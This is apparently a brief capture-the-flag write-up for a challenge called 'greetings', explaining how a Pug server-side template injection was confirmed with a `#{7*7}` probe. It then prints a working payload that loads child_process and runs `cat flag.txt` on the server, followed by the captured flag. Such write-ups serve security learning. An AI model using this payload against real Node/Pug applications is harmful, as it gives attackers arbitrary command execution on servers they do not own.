<img src="https://github.com/raul-dunca/assets/blob/main/.images/greetings.png?raw=true">

For this challenge, even if there is an XSS vulnerability (on which I wasted a considerable amount of time X_X) there is also a SSTI in Pug. Basically trying `#{7*7}` yields:

<img src="https://github.com/raul-dunca/assets/blob/main/.images/g1.png?raw=true">

So the SSTI is confirmed. After playing with some payloads I discovered this one:

```pug
#{new Function('return global.process.mainModule.require("child_process").execSync("cat flag.txt").toString()')()}
```

`TFCCTF{a6afc419a8d18207ca9435a38cb64f42fef108ad2b24c55321be197b767f0409}`
